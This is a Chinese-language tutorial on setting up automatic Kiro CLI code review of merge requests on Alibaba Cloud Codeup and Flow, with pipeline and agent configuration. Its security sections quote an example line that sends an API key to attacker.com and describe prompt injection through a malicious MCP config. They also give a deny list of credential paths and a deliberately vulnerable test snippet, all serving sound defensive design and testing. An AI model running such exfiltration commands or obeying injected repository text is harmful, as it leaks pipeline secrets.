# 在阿里云 Codeup 上启用 Kiro CLI 自动 MR 代码评审

> 开发者提交合并请求（MR），流水线自动调用 Kiro CLI headless 模式完成代码评审，把中文报告作为评论回写到 MR 页面。完成初始配置（授权、密钥、变量）后，正常的 MR 评审路径无需人工触发。本文记录在**云效 Codeup 中心站 + Flow 流水线**上从零搭建这套能力的完整过程，包括真实环境踩过的坑，也坦白列出它的边界与生产加固方向。
>
> 声明：本文提供的是**参考实现示例代码**，用于演示集成思路，非生产级现成方案；落地前请结合自身安全与合规要求评估、加固（见文末「安全边界」与「限制」）。

## 背景与目标

云效 Codeup 是阿里云的企业级代码托管平台，Flow 是配套的 CI/CD 流水线。Kiro 是 AWS 推出的 agentic 开发工具，其 CLI 的 **headless 模式**（`kiro-cli chat --no-interactive`）专为 CI/CD 场景设计：用 API Key 认证、传入提示词、端到端执行，无需交互终端。

本文要实现的能力：

- 开发者在 Codeup 提交/更新 MR → Flow 流水线被自动触发；
- 流水线调用 Kiro CLI 对本次变更做只读评审（可结合完整代码上下文，而非仅看 diff）；
- 评审结果以 Markdown 全局评论回写到 MR 页面；
- 本方案**本身不主动创建合并卡点**（不回写 Commit Status / Check Run）——评审定位为辅助、最终决策在人。但**是否真的阻塞合并，取决于目标仓库的保护分支配置**：若仓库开启了「评论未全部解决」卡点，脚本发的评论 `resolved:false` 仍可能挡住合并；若开启了「自动化检查未通过」卡点，流水线标红本身也可能阻止合并。接入前请核对目标仓库的保护分支规则（详见第九节）。

> **术语**：Codeup 的「合并请求（Merge Request，MR）」等同于 GitHub 的 Pull Request（PR）。

## 一、先理解一个关键差异：信任边界

通用原则：**任何"携带密钥、又执行不受信 MR 源分支脚本"的 CI 都存在密钥泄露风险。** MR 触发时，Flow 会 checkout **源分支**（MR 作者完全控制的代码），如果流水线执行的是源分支里的脚本，任何人提一个 MR 把脚本改成 `curl -d "$KIRO_API_KEY" https://attacker.com`，流水线就会带着私密变量执行它。

不同平台的默认防护不同——例如 GitHub Actions 对 fork PR 默认不注入 secrets。但依赖平台差异不如从架构上根除：本文采用**双代码源**，把"被评审的代码"和"被执行的脚本"彻底分开，这在任何代码平台上都成立。

**正确做法是双代码源**：

- **业务仓库**（被评审对象）：只作为**被分析的数据**，绝不执行其中任何脚本；
- **集成包仓库**（本方案的脚本所在，固定分支/tag）：流水线执行的脚本**只来自这里**，MR 作者碰不到。

这就是为什么本方案要求把集成脚本放进一个**独立的 Codeup 仓库**，而不是塞进业务仓库。

## 二、数据处理与合规（接入前必读）

本方案会把 **MR diff、以及 Kiro 通过 `read`/`grep` 读取到的仓库文件内容**发送至 Kiro 服务端进行评审。接入前务必确认符合组织要求：

- **数据出境与存储**：Kiro 会存储问题、响应、代码上下文及请求元数据；个人订阅者的内容默认存储在 US East（弗吉尼亚北部）；实验性模型（如 GPT-5.6 系列）可能涉及跨 Region 推理。
- **是否用于服务改进**：Free Tier 与个人订阅者的部分内容默认可能用于服务改进，可在 CLI 中选择退出；企业版内容不用于服务改进。以你的订阅类型与组织协议为准。
- **准入判断**：**涉密、受监管或禁止外发的代码库不应直接采用本文方案。** 先完成代码分类与授权确认，具体政策以 Kiro 官方 Data protection 文档和你的组织协议为准。

## 三、准备工作

### 3.1 Kiro 订阅与 API Key

- Headless 模式需要 API Key，仅 **Kiro Pro / Pro+ / Pro Max / Power** 订阅可生成；若是管理员管理的组织订阅，需管理员先开启 API Key 生成权限。
- 在 kiro.dev → 账户设置 → API Keys 生成，记为 `KIRO_API_KEY`。

### 3.2 云效个人访问令牌（或专用机器人账号）

- 云效控制台 → 头像 → 个人设置 → 个人访问令牌 → 新建，勾选**代码管理（只读）+ 合并请求（读写）**。PoC 用你自己的令牌即可。
- **生产建议：用专用机器人账号。** 评审评论的作者名与头像等于令牌所属账号，用一个叫 `Kiro`、头像是 Kiro icon 的专用账号，MR 上就显示为「Kiro 在评论」。Codeup 没有第三方 App/Bot 平台身份能力，专用成员账号是最接近的做法，**且不需改代码**。

  Codeup 客户通常已有阿里云账号和 RAM 体系，推荐用 **RAM 子账号**当这个 bot：在 RAM 建一个用户（如 `kiro-review-bot`，开控制台访问）→ 加入云效组织、仅授予目标库「代码只读 + MR 读写」→ 用该账号登录云效改昵称为 `Kiro`、传 Kiro 头像 → 生成个人访问令牌填入 `YUNXIAO_TOKEN`。注意机器人账号的头像、令牌只能由该账号**本人登录**设置，无法用 API 代劳——它依赖一个真实登录身份。

### 3.3 记下两个 ID

- **组织 ID**：藏在仓库 SSH 地址里，如 `git@codeup.aliyun.com:<organization-id>/xxx.git`，冒号后第一段就是。也可在「组织管理后台 → 基本信息」查。
- **业务库数字 ID**：进业务库 → 库设置 → 基本信息；或用 OpenAPI `ListRepositories` 查。

## 四、部署集成包仓库

在 Codeup 新建一个仓库（如 `kiro-review-kit`），放入这套集成包，结构如下：

```
kiro-review-kit/
├── scripts/
│   ├── kiro-review.sh          # 主编排：装 CLI → 隔离 → 定位 MR → diff → 评审 → 回写
│   └── lib/
│       ├── codeup-api.sh       # Codeup OpenAPI 封装（查 MR / 发评论）
│       └── diff-compress.sh    # 大 diff 优先级压缩
├── prompts/
│   └── review-prompt.md        # 评审提示词（中文、分级、密钥掩码）
├── kiro/
│   └── agent-codeup-reviewer.json  # 受信只读 custom agent
└── pipeline/
    ├── flow-pipeline.yaml       # 流水线参考配置
    └── setup-guide.md           # 配置指南
```

核心是一个纯 Bash 脚本，无重量级运行时依赖（Bash + git / curl / jq / GNU coreutils(timeout) 及 sed/awk/grep/sort/iconv 等常见文本工具，公共构建镜像通常自带）。推送到 Codeup：

```bash
git remote add codeup git@codeup.aliyun.com:<organization-id>/<integration-repo>.git
git push codeup main
```

> 生产环境给这个仓库的 `main` 设**分支保护**——能改它的人等于能接触所有接入流水线的密钥权限。

### 只读 custom agent（安全的关键一环）

Kiro CLI 会读取工作区级的 `.kiro/settings/mcp.json`，MR 作者可借此注入恶意 MCP server 让 Kiro 执行任意命令。我们用一个专用 custom agent 关闭这个面：

```json
{
  "name": "codeup-reviewer",
  "description": "Codeup MR 自动评审专用只读 agent",
  "model": "gpt-5.6-sol",
  "prompt": "你是只读代码评审助手。只允许读取文件与搜索内容，绝不执行命令、修改文件或访问网络。",
  "tools": ["read", "grep"],
  "allowedTools": ["read", "grep"],
  "resources": [],
  "includeMcpJson": false
}
```

要点：`includeMcpJson: false` 不加载工作区 MCP 配置；`tools`/`allowedTools` 仅 `read`/`grep`；脚本运行前还会 `rm -rf 业务仓库/.kiro` 双保险。

### 选择评审模型

Headless 模式下 `/model` 斜杠命令不可用，模型在 **agent 配置的 `model` 字段**指定。上面用的是 `gpt-5.6-sol`（Kiro 上线的 OpenAI GPT-5.6 Sol 旗舰档）。注意几点：

- **可用性有前提**：GPT-5.6 系列在 Kiro 属**实验性、逐步开放**能力，是否可用取决于你的订阅档位、所在 Region 与组织的模型访问策略；实验性模型可能涉及跨 Region 推理。
- **回退行为**（据官方 Agent 配置文档）：模型 ID 不匹配或不可用时，Kiro 回退默认模型并打警告——本文实测环境（Kiro CLI 2.13.1）日志中确认了 agent 与模型生效、无 fallback 警告；你的环境请以自己的 `/model` 列表和运行日志为准。
- **成本**：Sol 当前为 2.4x credit 倍率；本方案对每次 MR 更新都触发一次评审，接入前应评估调用成本。

## 五、创建 Flow 流水线

用 **YAML 模式**建流水线最省事。核心配置（`flow-pipeline.yaml`）：

```yaml
sources:
  business_repo:                          # 业务仓库：被评审对象，不受信
    type: codeup
    name: 业务代码库（占位，替换为实际库名）
    endpoint: https://codeup.aliyun.com/<organization-id>/<business-repo>.git
    branch: master
    triggerEvents:
      - mergeRequestOpenedOrUpdate        # 关键：不配置则代码源事件不触发流水线
    certificate:
      type: serviceConnection
      serviceConnection: "<授权后自动填入>"
  integration_repo:                       # 集成包仓库：受信脚本来源，不触发
    type: codeup
    name: 集成包仓库（占位，替换为实际库名）
    endpoint: https://codeup.aliyun.com/<organization-id>/<integration-repo>.git
    branch: main
    certificate:
      type: serviceConnection
      serviceConnection: "<授权后自动填入>"
defaultWorkspace: business_repo
stages:
  review_stage:
    name: 代码评审
    jobs:
      kiro_review:
        name: Kiro 自动评审
        runsOn:
          group: public/cn-beijing
          container: build-steps-public-registry.cn-beijing.cr.aliyuncs.com/build-steps/alinux3:latest
        steps:
          review_step:
            step: Command
            name: 运行 Kiro 评审
            with:
              run: |
                export REVIEW_REPO_DIR="$PROJECT_DIR"
                export CI_COMMIT_REF_NAME="$CI_COMMIT_REF_NAME_1"
                export MR_TARGET_BRANCH="$CI_COMMIT_TARGET_REF_NAME_1"
                bash "$PROJECT_DIR/../integration_repo/scripts/kiro-review.sh"
```

配置要点：

1. **`triggerEvents: [mergeRequestOpenedOrUpdate]`** 必须显式声明，否则 MR 事件不会触发流水线；只在业务库配置，集成包不触发。
2. **`certificate.serviceConnection`**：代码源授权凭证 ID。首次在 YAML 编辑器里粘贴后，校验器会提示并自动识别出你组织的服务连接 ID，填入即可（无法纯 API 完成，需 UI 授权一次）。
3. **`defaultWorkspace: business_repo`** 让 `$PROJECT_DIR` 指向业务库 checkout 目录；集成包脚本用 `$PROJECT_DIR/../integration_repo` 定位（两个源是兄弟目录）。
4. **`run` 里的三行 export** 是踩坑后的产物（见第七节），把正确的源分支和目标分支喂给脚本。

### 配置私密变量

流水线保存后，进「变量与缓存」→ 字符变量，加 4 个（前两个勾选**私密模式**）：

| 变量名 | 值 | 私密 |
|---|---|---|
| `KIRO_API_KEY` | Kiro API Key | ✅ |
| `YUNXIAO_TOKEN` | 云效令牌（建议 bot 账号） | ✅ |
| `YUNXIAO_ORG_ID` | 组织 ID | |
| `CODEUP_REPO_ID` | 业务库数字 ID | |

### 开启 MR 触发

编辑业务库代码源 → 开启「代码源触发」→ 勾选「合并请求新建/更新」。Flow 会自动向 Codeup 库注册 webhook（在业务库 设置 → Webhooks 可见）。

## 六、脚本做了什么

`kiro-review.sh` 的执行流程：

1. **依赖检查**：git/curl/jq/timeout 缺一即退（`timeout` 是强制依赖，防 Kiro 挂起占死流水线）；
2. **安装/检测 kiro-cli**：云托管构建机每次运行 `curl -fsSL https://cli.kiro.dev/install | bash`（约 30 秒）。**这是 PoC 便捷做法，不适合生产**——生产应固定 kiro-cli 版本、预装到自建构建机（避免每次拉取最新脚本带来的不可复现与供应链风险）；
3. **工作区隔离**：`rm -rf 业务库/.kiro` + 安装受信 custom agent 到 `~/.kiro/agents/`；
4. **定位 MR**：环境变量优先，否则用 OpenAPI 按源分支反查（同源分支多个开启的 MR 时报错要求显式指定，不静默取最新）；
5. **生成 diff**：`git merge-base` 三点比较；超 300KB 时按优先级压缩（代码 > 配置 > 文档，未直传文件以 diff chunk 索引交给 Kiro 用 read 自读）；
6. **执行评审**：`timeout` 强制限时下运行 `kiro-cli chat --no-interactive --trust-tools=read,grep --agent codeup-reviewer`；
7. **清洗与回写**：剥离 kiro-cli 输出的工具轨迹与 ANSI 色码，以 `# 代码评审报告` 为锚点截取正文，作为 GLOBAL_COMMENT 回写（HTTP 状态码判成败，仅网络/429/5xx 重试，append-only 带 `<!-- kiro-review:<sha> -->` 标记）。

评审提示词要求：中文输出、按 🔴严重/🟡警告/🔵建议 分级、引用文件路径行号、疑似密钥只掩码展示（前 4 后 4）、抗提示词注入、末尾给合并建议。

## 七、真实环境联调踩的三个坑

本地测试再充分，也覆盖不了平台接口和环境的细节。这三个问题都是在客户环境实测才暴露的：

### 坑 1：多代码源下源分支变量被污染

脚本用 `CI_COMMIT_REF_NAME` 猜源分支，但**多代码源场景下无下标内置变量取值不可预期**——它取到了集成包的 `main`，而非业务库 MR 的 `feature/xxx`，导致反查不到 MR。

实测 MR 触发时可用带下标变量：`CI_COMMIT_REF_NAME_1`（第一个源=业务库源分支）、`CI_COMMIT_TARGET_REF_NAME_1`（MR 目标分支）。解法就是流水线 `run` 里那三行 export 显式修正。

> 经验：首次接入务必先跑一次 `env | cut -d= -f1 | sort`（**只打变量名，绝不打值**——env 含私密变量且流水线日志长期保存）确认变量名，不同组织/多源顺序可能不同。

### 坑 2：回写评论接口 `resolved` 字段必填

Kiro 评审成功，但回写报 `HTTP 400 "resolved can not be null"`。中心站 `CreateChangeRequestComment` 接口的 `resolved` 字段**必填**（联调当时按早期文档示例把它当可选，才踩了坑；现行官方文档已标为必填）。请求体补上 `resolved: false` 即通过。

### 坑 3：kiro-cli 输出混入工具轨迹与色码

headless 模式下 kiro-cli 把工具调用轨迹（`Reading directory...`）和 ANSI 颜色码一并打到 stdout，混进了评论正文；而且报告标题被加了 Markdown 引用前缀 `> `。解法：`sed` 剥离 ANSI 序列 + 以 `# 代码评审报告`（正则兼容 `> ` 前缀）为锚点截取正文。

## 八、验证效果

在业务库提一个含明显问题的 MR（**务必用合成假密钥**如 `FAKE-TEST-KEY-0000`，严禁真实凭证）：

```python
ADMIN_API_KEY = "FAKE-TEST-KEY-a1b2c3d4e5f60718"           # 硬编码凭证
rows = conn.execute("SELECT ... WHERE name LIKE '%" + keyword + "%'")  # SQL 注入
subprocess.run("ping -c 1 " + host, shell=True)             # 命令注入
app.run(host="0.0.0.0", port=8080, debug=True)              # 调试模式对外
```

MR 页面随后出现 Kiro 的中文评审评论。本文一次实测样本（Kiro CLI 2.13.1、模型 gpt-5.6-sol、diff 完整直传、公共 alinux3 构建集群 MEDIUM 2C4G）中：

- 端到端约 3 分钟（含每次运行重装 kiro-cli 约 30 秒 + 模型评审约 2.5 分钟）——这只是一次样本，不构成性能承诺，实际时长随 CLI 版本、模型、diff 大小和 Runner 规格变化；
- 植入 4 处安全问题（硬编码凭证、SQL 注入、命令注入、调试模式对外），Kiro **全部识别**，密钥掩码为 `FAKE****0718`，且**额外**指出了 2 个警告（数据库连接未关闭、ping 子进程无超时/未检查返回码），结论「不建议合并」。

（注：AI 评审存在漏报与误报可能，本样本"全中"不代表每次都如此，务必人工复核。）

---

## 九、进阶（尚未包含在示例代码、也未纳入本文验收范围的演进方向）：与 Codeup 合并卡点及其他特性结合

前面的方案是「评论辅助、不阻塞合并」。如果你想让评审结果真正参与**门禁**，Codeup 提供了几种集成能力，可按需组合。

### 9.1 三方检查 + 提交状态（Commit Status）→ 合并卡点

Codeup 支持通过 OpenAPI 回写**提交状态**（`CreateCommitStatus`），状态有 `success` / `failure` / `pending` / `error` 四种，可带描述和跳转链接。回写后：

- 状态会展示在 MR 的「自动化检查」区；
- 在「库设置 → 分支设置 → 保护分支规则」中打开「要求合并前通过自动化执行检查」，**不满足的状态会阻止合并**。

改造思路：让 `kiro-review.sh` 除了发评论，再根据评审结论回写提交状态。**但不要靠 grep 文本里的 🔴 来判定**——输出格式一变或被提示词注入就会失效。稳妥做法是让评审提示词输出**受 schema 约束的 JSON**（含每个问题的严重级别字段），脚本解析该 JSON 得出结论；解析失败时应有明确的降级策略（例如保守判 `error` 或退回纯评论模式，而非误判 `success`）。这样 Kiro 才能从「建议者」稳妥地变成「卡点者」。

> **权衡（重要）**：AI 评审存在误报，把它设成硬卡点会阻塞正常合并，需要配套「人工豁免/重跑」机制，否则开发者会被误判卡住。建议路径：先以评论模式运行数周、观察误报率，团队建立信任后，再逐步收紧为卡点——且首期只对「硬编码密钥」这类**高精确度、低误报**的规则卡点，风格类问题永远只做建议。

### 9.2 检查运行（Check Runs）→ 更丰富的门禁展示

比提交状态更高级的是 **Check Runs**（检查运行）能力，通过 OpenAPI 管理完整生命周期，支持：

- 丰富的状态枚举（`status` + `conclusion` 两段式）；
- **检查注释（Check Annotations）**：把问题精确标注到具体文件的具体行（`startLine`/`endLine`/`startColumn`）；
- 自定义 Markdown 结果视图（`text` 字段，上限 64KB）；
- 同样可设为保护分支的合并卡点。

如果希望 Kiro 的评审结果不只是一条评论、而是像专业 CI 那样**逐行标注 + 独立检查项 + 门禁**，Check Runs 是正解。代价是要解析 Kiro 输出的结构化问题（文件+行号+严重级别），并映射到 annotation——建议让评审提示词直接输出 JSON 结构（而非当前的自由 Markdown），降低解析难度。

### 9.3 与 Codeup 内置代码检测互补

Codeup 自带代码检测服务（规范扫描、敏感信息检测、安全漏洞规则库，基于确定性规则）。它和 Kiro 是**互补而非替代**：

- **内置检测**：基于确定性规则（如阿里巴巴 Java 规约、密钥正则），结果相对可复现、可设可调阈值门禁——适合做**硬卡点**（注：确定性规则同样可能误报，只是比 LLM 更可预期、更易调阈值）；
- **Kiro 评审**：理解语义、跨文件推理、发现规则覆盖不到的逻辑/设计问题——适合做**建议 + 高危项卡点**。

推荐组合：内置检测负责「规范与已知漏洞」的硬门禁，Kiro 负责「语义级审查」的智能补充。注意：本文的基础方案只回写 GLOBAL_COMMENT（在 MR 的**评论区**），**不进入「自动化检查」区**；只有按 9.1/9.2 增加了 Commit Status 或 Check Runs 之后，Kiro 结果才会与内置检测一起汇聚到「自动化检查」区。

### 9.4 关联工作项、评审人卡点等

- **CodeOwner 机制**：Kiro 评审可作为 CodeOwner 人工评审的前置输入——Kiro 先过一遍列出风险点，人工评审聚焦在 Kiro 标记的严重项上，提效明显；
- **关联工作项**：Kiro 评审结论可回写到 MR 关联的云效工作项，形成质量追溯；
- **多流水线编排**：Kiro 评审可作为流水线的一个 stage，与单元测试、构建、镜像扫描等串联，任一失败都反映在 MR 检查区。

### 小结：三种成熟度

| 阶段 | 集成方式 | 卡点 | 适用 |
|---|---|---|---|
| 入门（本文主线） | GLOBAL_COMMENT 评论 | 不卡 | 快速见效、建立信任 |
| 进阶 | + Commit Status 提交状态 | 高危项卡点 | 团队信任后收紧门禁 |
| 完整 | + Check Runs 逐行注释 | 独立检查项卡点 | 追求专业 CI 体验 |

从入门起步、按团队对 AI 评审的信任度逐级演进，是风险最低的落地路径。

---

## 附：本方案的安全边界（诚实版）

本方案把被评审的 MR 源分支代码**全部视为不受信数据**，做了多层缓解：脚本只从独立受信仓库执行、运行前移除工作区 `.kiro/`、custom agent 关闭 MCP 加载（`includeMcpJson: false`）、工具仅 `read`/`grep` 且用 `toolsSettings.deniedPaths` 拒绝 `/proc`、`/sys`、`~/.ssh`、`~/.aws`、`~/.kiro` 等敏感路径、密钥全走私密变量。

但要明确边界：**只读工具不等于完整文件系统沙箱。** `--trust-tools` 是"自动批准工具"而非沙箱；Kiro 子进程仍继承 `KIRO_API_KEY`、`YUNXIAO_TOKEN` 等环境变量，`deniedPaths` 是黑名单而非白名单，理论上仍存在未覆盖路径或符号链接逃逸的读取面。因此：

- **生产环境应把 Kiro 运行在只挂载待评审代码的隔离容器**，将 Kiro 评审与「回写评论」拆成两步——`YUNXIAO_TOKEN` 只在回写步骤出现、不进入 Kiro 执行环境；容器不挂载宿主 Home、其他代码源和云凭证。
- **提示词注入仍可能影响评审结论**，故评审结果应由人工复核，不应单独作为高风险变更的最终决策依据。
- 发布/上线前建议做**负向安全验收**：在环境放一个合成 canary secret，在 MR 里加诱导读取环境变量/`/proc`/兄弟目录的注入文本，确认 Kiro 读不到、且评论与日志不出现 canary。

（本文提供的是参考实现示例，非生产级安全保证；请结合自身合规要求评估后再落地。）

## 成本考量

- **模型调用**：每次 MR 新建/更新都触发一次评审。GPT-5.6 Sol 当前为 2.4x credit 倍率，频繁更新的大 MR 会累积消耗——可用分支过滤、路径过滤、或只在特定目标分支触发来收敛范围。
- **流水线资源**：评审跑在 Flow 构建资源上（本样本单次约 3 分钟）。云托管构建机每次重装 kiro-cli 约 30 秒；生产用自建机预装固定版本可省这部分并提升可复现性。
- **权衡**：把 diff 而非整仓喂给模型可省 token；对超大 MR 本方案已做优先级压缩（>300KB）。

## 限制与生产加固清单

本文示例聚焦"打通链路"，以下项在生产落地前应逐一评估：

- **隔离**：将 Kiro 评审与评论回写拆成独立步骤/容器，令牌不进入 Kiro 环境（见「安全边界」）；
- **可复现性**：固定构建镜像 digest 与 kiro-cli 版本，不用 `latest` 和每次 `curl | bash`；
- **卡点行为**：核对目标仓库保护分支规则（评论未解决卡点、自动化检查卡点），明确 Kiro 评论应为待解决还是自动已解决；
- **输出稳定性**：当前靠文本锚点清洗 kiro-cli 输出，属脆弱点——若 CLI 提供纯结果输出旗标应优先改用；进阶卡点应让模型输出受 schema 约束的 JSON；
- **负向安全验收**：canary secret + 提示词注入测试（见「安全边界」）；
- **数据合规**：见第二节，涉密/受监管仓库不接入。

## 结论

本文在云效 Codeup 中心站 + Flow 上，用一套纯 Bash 集成包打通了"MR 触发 → Kiro headless 只读评审 → 中文报告回写 MR"的完整链路，并给出了三种成熟度的演进路径。关键设计是**信任边界（双代码源）**与**评审定位为辅助而非门禁**。它不是开箱即用的生产方案，而是一个可据以加固的参考实现——真正的价值在于把 Codeup 特有的坑（多代码源变量、OpenAPI 契约、输出清洗）和安全边界讲清楚，让你少走弯路。

## 参考资料

- Kiro Headless mode — https://kiro.dev/docs/cli/headless/
- Kiro Agent 配置参考 — https://kiro.dev/docs/cli/custom-agents/configuration-reference/
- Kiro 内置工具（read/grep 的 allowedPaths/deniedPaths）— https://kiro.dev/docs/cli/reference/built-in-tools
- Kiro 数据保护 — https://kiro.dev/docs/privacy-and-security/data-protection/
- GPT-5.6 in Kiro — https://kiro.dev/blog/gpt-5-6
- 云效 Flow 流水线源 YAML 语法 — https://help.aliyun.com/zh/yunxiao/user-guide/pipeline-sources
- Codeup CreateChangeRequestComment — https://help.aliyun.com/zh/yunxiao/developer-reference/createchangerequestcomment
- Codeup 代码评审与合并（合并卡点）— https://help.aliyun.com/zh/yunxiao/user-guide/consolidation-request-capability-overview
- Codeup CreateCommitStatus / CreateCheckRun（进阶门禁）— 见云效 OpenAPI 文档「代码管理」章节

## 示例代码免责声明

本文所附代码为**演示集成思路的示例**，按「现状（as-is）」提供，不含任何明示或默示担保。使用前请自行审阅、测试并按自身安全与合规要求加固；对因使用本示例造成的任何后果，作者不承担责任。文中涉及的第三方产品能力（Kiro 模型可用性、Codeup 接口行为等）以各官方文档与你的实际环境为准。
